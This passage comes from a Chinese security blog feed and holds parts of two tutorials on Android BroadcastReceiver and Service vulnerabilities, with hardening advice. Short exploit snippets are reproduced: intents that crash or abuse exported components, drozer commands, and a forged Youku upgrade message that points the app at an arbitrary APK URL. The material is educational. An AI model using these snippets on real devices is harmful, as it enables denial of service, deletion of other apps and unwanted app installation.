id="（1）漏洞介绍-1"><a href="#（1）漏洞介绍-1" class="headerlink" title="（1）漏洞介绍"></a>（1）漏洞介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。</span><br><span class="line">拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞复现-3"><a href="#（2）漏洞复现-3" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042755.html">QQ手机管家拒绝服务漏洞</a></p><p>漏洞描述：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">恶意软件发送一个消息就可以轻松让QQ手机管家拒绝服务，安全防护完全失灵。</span><br><span class="line">com.tencent.qqpimsecure.service.InOutCallReceiver这个广播组件没有对消息进行校验，导致空消息造成<span class="literal">null</span> point问题，直接crash.</span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componetName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(  <span class="string">&quot;com.tencent.qqpimsecure&quot;</span>,  <span class="string">&quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;</span>);         </span><br><span class="line">i.setComponent(componetName);       </span><br><span class="line">sendBroadcast(i);</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/12.png" alt="image-20210912155436267"></p><p>案例2：fourgoats.apk拒绝服务攻击崩溃</p><p>我们首先用drozer测试可导出组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info  -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/13.png" alt="image-20210912155436267"></p><p>我们根据组件的类名找对对应的源码信息，发现需要两个参数 phoneNumber、message：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/14.png" alt="image-20210912155436267"></p><p>我们发送恶意广播:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action 广播名 --extra string name lisi</span><br></pre></td></tr></table></figure><p>在此之前，我们在AndroidManifest.xml文件里面获取广播名：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/15.png" alt="image-20210912155436267"></p><p>我们发送恶意广播：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber <span class="number">1234</span> --extra string message dog</span><br></pre></td></tr></table></figure><p>可以发现我们恶意广播发送成功</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/16.png" alt="image-20210912155436267"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/17.png" alt="image-20210912155436267"></p><p>我们再向广播组件发送不完整intent，使用空 extras，可以看到应用停止运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action &lt;action&gt;</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/18.png" alt="image-20210912155436267"></p><p>我们就成功完成一次拒绝服务攻击</p><p>修复：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">空指针异常</span><br><span class="line">类型转换异常</span><br><span class="line">数组越界访问异常</span><br><span class="line">类未定义异常</span><br><span class="line">其他异常</span><br><span class="line"></span><br><span class="line"><span class="comment">//Serializable：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="built_in">this</span>.getIntent();</span><br><span class="line"><span class="keyword">if</span>(i.getAction().equals(“serializable_action”))&#123;</span><br><span class="line"></span><br><span class="line">  i.getSerializableExtra(<span class="string">&quot;serializable_key&quot;</span>);<span class="comment">//未做异常判断</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Parcelable:</span></span><br><span class="line"><span class="built_in">this</span>.b=(RouterConfig)<span class="built_in">this</span>.getIntent().getParcelableExtra(“filed_router_config”);<span class="comment">//引发转型异常崩溃</span></span><br><span class="line"></span><br><span class="line">谨慎处理接收的intent以及其携带的信息。</span><br><span class="line">对接收到的任何数据做<span class="keyword">try</span> <span class="keyword">catch</span>处理，以及对不符合预期的数据做异常处理。</span><br></pre></td></tr></table></figure><p>拒绝服务攻击可以参考Activity的拒绝服务攻击和Service的拒绝服务攻击</p><h2 id="四、Broadcast-Reciver的安全防护"><a href="#四、Broadcast-Reciver的安全防护" class="headerlink" title="四、Broadcast Reciver的安全防护"></a>四、Broadcast Reciver的安全防护</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）私有广播接收器设置exported=’<span class="literal">false</span>’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</span><br><span class="line">（<span class="number">2</span>）对接收来的广播进行验证。</span><br><span class="line">（<span class="number">3</span>）内部app之间的广播使用protectionLevel=’signature’ 验证其是否真是内部app。</span><br><span class="line">（<span class="number">4</span>）返回结果时需注意接收app是否会泄露信息。</span><br><span class="line">（<span class="number">5</span>）发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。</span><br><span class="line">（<span class="number">6</span>）使用LocalBroadcastManager。</span><br></pre></td></tr></table></figure><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文主要介绍了Android中广播机制的运行原理，并对Android广播机制中的常见漏洞做了一个初步的总结，我们可以发现Android的四大组件的漏洞原理基本存在很大的相关性，在拒绝服务攻击中，这里用了一个简易的样本，并逐步实现了拒绝服务攻击的步骤，本文可能还存在很多不足，后续逐步完善，也欢迎各位大佬指正。</p><h2 id="六、参考网址"><a href="#六、参考网址" class="headerlink" title="六、参考网址"></a>六、参考网址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Android第一行代码</span><br><span class="line">https://www.jianshu.com/p/ca3d87a4cdf3</span><br><span class="line">https://blog.csdn.net/q376794191/article/details/85292952</span><br><span class="line">https://www.cnblogs.com/lwbqqyumidi/p/4168017.html</span><br><span class="line">https://www.jianshu.com/p/c1a826a5beea</span><br><span class="line">https://www.jianshu.com/p/e236a2669797</span><br><span class="line">https://www.jianshu.com/p/e236a2669797</span><br><span class="line">https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/</span><br><span class="line">https://tea9.xyz/post/962818054.html</span><br><span class="line">https://paper.seebug.org/papers/Archive/drops2/Android%20Broadcast%20Security.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;今天继续总结Android APP漏洞四大组件中Broadcast Recevier漏洞挖掘的知识，主要分为两个部分，一部分对Android 广播机制原理作一个初步的总结，另一部分便是对Android 广播机制常见的一些漏洞进行总结，主要是介绍一些已存在的典型漏洞，部分知识可以参考前两篇帖子&lt;a href=&quot;https://bbs.pediy.com/thread-269255.htm&quot;&gt;Android APP漏洞之战（2）——Service漏洞挖掘详解&lt;/a&gt;和&lt;a href=&quot;https://bbs.pediy.com/thread-269211.htm&quot;&gt;Android APP漏洞之战（1）——Activity漏洞挖掘详解&lt;/a&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（10）——Service漏洞挖掘详解</title>
    <link href="http://security-kitchen.com/2023/02/13/bug0010/"/>
    <id>http://security-kitchen.com/2023/02/13/bug0010/</id>
    <published>2023-02-13T01:02:19.000Z</published>
    <updated>2023-12-23T09:13:44.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>今天总结Android APP漏洞挖掘四大组件中service漏洞挖掘的知识，希望能通过这系列的文章，对Android APP漏洞挖掘进行一个更加深入的了解，Android APP中Service的漏洞挖掘和我们前文讲的Activity漏洞挖掘差不多，所以部分知识可以参考上篇帖子<a href="https://bbs.pediy.com/thread-269211.htm">Android APP漏洞之战（1）——Activity漏洞挖掘详解</a>。在Service漏洞挖掘中，会逐一列出最基本的漏洞特征，后续会逐步补充相关的漏洞。</p><span id="more"></span><h2 id="二、Service漏洞初步介绍"><a href="#二、Service漏洞初步介绍" class="headerlink" title="二、Service漏洞初步介绍"></a>二、Service漏洞初步介绍</h2><h3 id="1-service基本介绍"><a href="#1-service基本介绍" class="headerlink" title="1.service基本介绍"></a>1.service基本介绍</h3><h4 id="（1）service的基本作用"><a href="#（1）service的基本作用" class="headerlink" title="（1）service的基本作用"></a>（1）service的基本作用</h4><p>Service(服务)是一个一种可以在后台执行长时间运行操作而没有用户界面的应用组件。服务可由其他应用组件启动（如Activity），服务一旦被启动将在后台一直运行，即使启动服务的组件（Activity）已销毁也不受影响。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。</p><h4 id="（2）service的引入-lt-线程与服务的区别-gt"><a href="#（2）service的引入-lt-线程与服务的区别-gt" class="headerlink" title="（2）service的引入&lt;线程与服务的区别&gt;"></a>（2）service的引入&lt;线程与服务的区别&gt;</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Thread是程序执行的最小单元，是分配CPU的基本单位，可以使用Thread来执行一些异步操作</span><br><span class="line">（<span class="number">2</span>）Service是android的一种机制，运行在主线程的main线程上</span><br><span class="line">    </span><br><span class="line"> 问题：Thread的运行是独立与Activity的，当一个Activity被finish后，你没有主动停止Thread的话，Thread就会一直执行但是Activity被finish后，你不在持有该Thread的引用，你没有办法在不同的Activity中对同一Thread进行控制？</span><br><span class="line"> 解决：你的Thread需要不停的间隔一段时间连接服务器做某种同步，该Thread需要在Activity没有start时候也运行，但是你start一个Activity后，你就不能控制Thread。因此你创建一个Service，在Service里面创建、运行并控制Thread，就可以解决（任何Activity都可以控制同一Service）</span><br><span class="line">    </span><br><span class="line"> 总结：Service是一种消息机制，而你可以在任何有 Context 的地方调用 Context.startService、Context.stopService、Context.bindService，Context.unbindService，来控制它，你也可以在 Service 里注册 BroadcastReceiver，在其他地方通过发送broadcast 来控制它，当然这些都是 Thread 做不到的</span><br></pre></td></tr></table></figure><h4 id="（3）service的创建"><a href="#（3）service的创建" class="headerlink" title="（3）service的创建"></a>（3）service的创建</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">步骤：</span><br><span class="line">（<span class="number">1</span>）我们创建一个服务service</span><br><span class="line">（<span class="number">2</span>）我们重写服务中的三大方法onCreate()、onStartCommand()、onDestroy()</span><br><span class="line"> 详解：</span><br><span class="line">（<span class="number">1</span>）OnCreate()方法会在服务创建的时候调用</span><br><span class="line">（<span class="number">2</span>）onStartCommand()方法会在每次服务启动的时候调用</span><br><span class="line">（<span class="number">3</span>）onDestroy()会在服务销毁的时候调用通常我们希望在服务启动立刻执行某个动作，就会在onStartCommand()里</span><br></pre></td></tr></table></figure><h4 id="（4）service的启动"><a href="#（4）service的启动" class="headerlink" title="（4）service的启动"></a>（4）service的启动</h4><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/1.png" alt="image-20210908160022420"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">启动方式：</span><br><span class="line">（<span class="number">1</span>）startService：主要用于启动一个服务执行后台任务，不进行通信，而且必须用stopService来结束，不调用会导致Activity结束而Service还运行</span><br><span class="line">（<span class="number">2</span>）bindService：该方法启动的服务还可以进行通信，启动的Service可以由unbindService来结束，也可以在Activity结束之后自动结束</span><br><span class="line">（<span class="number">3</span>）startService 同时也 bindService 启动的服务：停止服务应同时使用stepService与unbindService</span><br></pre></td></tr></table></figure><p>一般来说我们使用服务，主要分为前面两种</p><p><strong>StartService：</strong></p><p>我们根据Intent的启动方式，又可以通过显式启动和隐式启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">显示启动：</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,TestService.class);</span><br><span class="line">startService(intent);</span><br><span class="line">隐式启动：</span><br><span class="line">（<span class="number">1</span>）使用Action启动</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();<span class="comment">//Intent intent = new Intent(&quot;活动&quot;)</span></span><br><span class="line">intent.setAction(<span class="string">&quot;XXX&quot;</span>);<span class="comment">//service中定义的action</span></span><br><span class="line">intent.setPackage(getPackageName);需要设置的应用包名</span><br><span class="line">startService(intent);</span><br><span class="line">（<span class="number">2</span>）使用包名启动</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span>·Intent();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componentName</span> <span class="operator">=</span> New <span class="title function_">ComponentName</span><span class="params">(getPackageName()</span>,<span class="string">&quot;com.example.testservices.TestService&quot;</span>);</span><br><span class="line">intent.setComponent(componentName);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure><p><strong>通过bindService启动：</strong></p><p>我们要实现服务或活动之间的通信，我们要使用bind通信机制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原理解析：</span><br><span class="line">（<span class="number">1</span>）bindService启动的服务和调用者是典型的client-server模式。调用者是client，service是server端。service只有一个，但是绑定到service上的client可以有一个或多个。</span><br><span class="line">（<span class="number">2</span>）client可以通过IBinder接口获取Service实例，从而实现在client端直接调用Service，实现灵活交互</span><br><span class="line">（<span class="number">3</span>）bindService启动服务的生命周期与其绑定的client息息相关，当client销毁时，绑定解除，或者使用unbindService()方法解除绑定</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">实现步骤：</span><br><span class="line">服务端：</span><br><span class="line">（<span class="number">1</span>）定义一个类继承Service</span><br><span class="line">（<span class="number">2</span>）在Service的onBind()方法中返回IBinder类型的实例</span><br><span class="line">（<span class="number">3</span>）在service中创建binder的内部类，加入类似getService()的方法返回Service，这样绑定的client就可以通过getService()方法获得Service实例了</span><br><span class="line">客户端：</span><br><span class="line">（<span class="number">1</span>）在Manifest.xml文件中配置该Service</span><br><span class="line">（<span class="number">2</span>）创建ServiceConnection类型实例，并重写onServiceConnected()方法和onServiceDisconnected()方法</span><br><span class="line">（<span class="number">3</span>）当执行到onServiceConnected回调时，可通过IBinder实例得到Service实例对象，这样可实现client与Service的连接</span><br><span class="line">（<span class="number">4</span>）onServiceDisconnected回调被执行时，表示client与Service断开连接，在此可以写一些断开连接后需要做的处理</span><br><span class="line">（<span class="number">5</span>）通过Intent 启动服务<span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,MyService.class);</span><br><span class="line">（<span class="number">6</span>）使用Context的bindService(Intent,ServiceConnection,<span class="type">int</span>)方法启动该Service</span><br><span class="line">（<span class="number">7</span>）不再使用时，调用unbindService(ServiceConnection)方法停止该服务</span><br></pre></td></tr></table></figure><h3 id="2-Service漏洞的种类和危害"><a href="#2-Service漏洞的种类和危害" class="headerlink" title="2.Service漏洞的种类和危害"></a>2.Service漏洞的种类和危害</h3><p>Service漏洞的种类大致可以分为：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/2.png" alt="image-20210908160946499"></p><p>Service漏洞的危害：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Service是android四大组件之一，可以长时间的运行在后台。一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。Service不是分离开的进程，除非其他特殊情况，它不会运行在自己的进程，而是作为运行它的进程的一部分。Service不是线程，意味着它将在主线程里劳作。</span><br><span class="line">如果一个导出的Service没有做严格的限制，任何应用都可以去启动并绑定到这个Service上，取决于被暴露的功能， 这可以是一个应用去执行未授权的行为，获取敏感信息或污染修改内部应用的状态造成威胁。</span><br></pre></td></tr></table></figure><h2 id="三、Service漏洞原理分析和复现"><a href="#三、Service漏洞原理分析和复现" class="headerlink" title="三、Service漏洞原理分析和复现"></a>三、Service漏洞原理分析和复现</h2><h3 id="1-权限提升漏洞"><a href="#1-权限提升漏洞" class="headerlink" title="1.权限提升漏洞"></a>1.权限提升漏洞</h3><h4 id="（1）原理介绍"><a href="#（1）原理介绍" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当一个service配置了intent-filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048735"><strong>猎豹清理大师内存清理权限泄露漏洞</strong></a></p><p>漏洞描述：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android应用程序猎豹清理大师（原金山清理大师）<span class="number">4.0</span><span class="number">.1</span>及以下版本存在权限泄漏漏洞，泄露的权限为android.permission.RESTART_PACKAGES，用来结束进程来达到清理内存的目的。当没有申请此权限的app向猎豹清理大师发送相应的intent时，便可以结束后台运行的部分app进程。</span><br><span class="line">猎豹清理大师暴露了com.cleanmaster.appwidget.WidgetService服务组件（详见下图），当向此服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程。</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/3.png" alt="image-20210908160946499"></p><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.cleanmaster.appwidget.ACTION_FASTCLEAN&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.cleanmaster.appwidget.WidgetService&quot;</span>);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure><p>我们通过Intent隐私启动，给服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程</p><p>案例2：<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2010-0509"><strong>乐phone手机任意软件包安装删除漏洞</strong></a></p><p>漏洞描述：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">乐phone手机出厂默认包含一个名为jp.aplix.midp.tools的应用包。本应用以system权限运行，并向其他应用提供ApkInstaller服务，用来进行对Apk文件的安装和删除。通过向ApkInstaller服务传递构造好的参数，没有声明任何权限的应用即可达到安装和删除任意Package的行为，对系统安全性产生极大影响。</span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">in.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;jp.aplix.midp.tools&quot;</span>,<span class="string">&quot;jp.aplix.midp.tools.ApkInstaller&quot;</span>));</span><br><span class="line">in.putExtra(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;deleteApk&quot;</span>);</span><br><span class="line">in.putExtra(<span class="string">&quot;pkgName&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>);</span><br><span class="line">startService(in);</span><br></pre></td></tr></table></figure><p>我们通过Intent隐式启动，外部服务启动的方式，启动action为deleteApk的服务，来达到删除任意Package的行为</p><h3 id="2-service劫持"><a href="#2-service劫持" class="headerlink" title="2.service劫持"></a>2.service劫持</h3><h4 id="（1）原理介绍-1"><a href="#（1）原理介绍-1" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击原理：隐式启动services,当存在同名services,先安装应用的services优先级高</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0010/4.png" alt="image-20210908160946499"></p><h3 id="3-消息伪造"><a href="#3-消息伪造" class="headerlink" title="3.消息伪造"></a>3.消息伪造</h3><h4 id="（1）原理介绍-2"><a href="#（1）原理介绍-2" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例：<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094635"><strong>优酷Android 4.5客户端升级漏洞</strong></a></p><p>漏洞描述：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">优酷Android <span class="number">4.5</span>客户端组件暴露导致第三方应用可以触发其升级过程，同时可以指定升级下载的URL地址，可导致任意应用安装！</span><br><span class="line">源代码：</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onHandleIntent</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Intent v0;</span><br><span class="line">        String v23;</span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">pushMsg</span> <span class="operator">=</span> intent.getSerializableExtra(<span class="string">&quot;PushMsg&quot;</span>);</span><br><span class="line">        ......</span><br><span class="line">        AppVersionManager.getInstance(Youku.context).showAppAgreementDialog();</span><br><span class="line">        <span class="keyword">switch</span>(pushMsg.type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                goto label_53;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    label_53:</span><br><span class="line">        intent.setFlags(<span class="number">876609536</span>);</span><br><span class="line">        intent.setClass(<span class="built_in">this</span>, UpdateActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateurl&quot;</span>, pushMsg.updateurl);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateversion&quot;</span>, pushMsg.updateversion);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updatecontent&quot;</span>, pushMsg.updatecontent);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateType&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">this</span>.startActivity(intent);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>漏洞分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以发现从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为<span class="number">1</span>时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址。</span><br></pre></td></tr></table></figure><p>漏洞攻击：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>创建一个Android App程序，在主Activity中的关键代码如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">PushMsg</span> <span class="variable">pushMsg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PushMsg</span>();</span><br><span class="line">pushMsg.type = <span class="number">1</span>;</span><br><span class="line">pushMsg.updateurl = <span class="string">&quot;http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;</span>;</span><br><span class="line">pushMsg.updatecontent = <span class="string">&quot;This is Fake&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.youku.phone&quot;</span>,<span class="string">&quot;com.youku.service.push.StartActivityService&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;PushMsg&quot;</span>, pushMsg);</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span 